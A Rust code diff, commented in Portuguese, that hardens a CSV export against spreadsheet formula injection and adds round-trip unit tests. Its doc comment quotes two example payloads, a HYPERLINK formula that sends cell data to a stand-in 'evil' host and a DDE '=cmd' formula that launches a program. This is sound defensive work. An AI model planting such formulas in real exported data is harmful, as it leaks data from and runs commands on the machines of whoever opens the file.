@@ -57,12 +57,36 @@ pub(crate) fn fmt_num(v: f64) -> String {
     format!("{v}").replace('.', ",")
 }
 
-/// Escapa um campo CSV: aspas quando contém `;`, `"` ou quebra de linha.
+/// Escapa um campo CSV e NEUTRALIZA injeção de fórmula (§11).
+///
+/// Duas defesas: (1) envolve em aspas quando o campo contém `;`, `"` ou quebra
+/// (estrutura do CSV); (2) prefixa com `'` quando o 1º caractere dispararia
+/// fórmula em Excel/LibreOffice/Sheets (`= + - @ TAB CR`). Sem (2), um nome de
+/// produto/insumo como `=HYPERLINK("http://evil"&A1,"x")` ou `=cmd|'/c calc'!A1`
+/// (DDE) executaria ao abrir o CSV — e o dado é não-confiável (um funcionário de
+/// baixo privilégio o grava; o admin exporta e abre; vale também para dado vindo
+/// por sync). O prefixo é revertido no import por `strip_formula_guard`.
 pub(crate) fn csv_field(s: &str) -> String {
-    if s.contains([';', '"', '\n', '\r']) {
-        format!("\"{}\"", s.replace('"', "\"\""))
+    let guarded = if starts_formula(s) { format!("'{s}") } else { s.to_string() };
+    if guarded.contains([';', '"', '\n', '\r']) {
+        format!("\"{}\"", guarded.replace('"', "\"\""))
     } else {
-        s.to_string()
+        guarded
+    }
+}
+
+/// O 1º caractere dispara fórmula em planilhas?
+fn starts_formula(s: &str) -> bool {
+    matches!(s.chars().next(), Some('=' | '+' | '-' | '@' | '\t' | '\r'))
+}
+
+/// Inverso de `csv_field`: remove o prefixo defensivo `'` quando ele precede um
+/// caractere de fórmula, preservando o round-trip export→import (ex.: `'-1,5` →
+/// `-1,5`, inclusive números negativos). Deixa intacto qualquer outro `'`.
+pub(crate) fn strip_formula_guard(s: &str) -> &str {
+    match s.strip_prefix('\'') {
+        Some(rest) if starts_formula(rest) => rest,
+        _ => s,
     }
 }
 
@@ -211,6 +235,28 @@ mod tests {
         assert_eq!(csv_field("Taça; 250ml"), "\"Taça; 250ml\"");
         assert_eq!(csv_field("simples"), "simples");
         assert_eq!(csv_field("diz \"oi\""), "\"diz \"\"oi\"\"\"");
+    }
+
+    #[test]
+    fn neutraliza_formula_no_export() {
+        // Campos que disparariam fórmula ganham o prefixo defensivo `'`.
+        assert_eq!(csv_field("=HYPERLINK(\"x\")"), "\"'=HYPERLINK(\"\"x\"\")\"");
+        assert_eq!(csv_field("+1"), "'+1");
+        assert_eq!(csv_field("-cmd"), "'-cmd");
+        assert_eq!(csv_field("@x"), "'@x");
+        // Texto benigno não é tocado.
+        assert_eq!(csv_field("Coca-Cola"), "Coca-Cola");
+    }
+
+    #[test]
+    fn strip_formula_guard_round_trip() {
+        // Inverso exato do export, inclusive número negativo.
+        assert_eq!(strip_formula_guard("'=cmd"), "=cmd");
+        assert_eq!(strip_formula_guard("'-1,5"), "-1,5");
+        assert_eq!(strip_formula_guard(csv_field("=perigo").trim_matches('"')), "=perigo");
+        // `'` que NÃO precede fórmula fica intacto (não corrompe dado legítimo).
+        assert_eq!(strip_formula_guard("'aspas"), "'aspas");
+        assert_eq!(strip_formula_guard("normal"), "normal");
     }
 
     #[test]
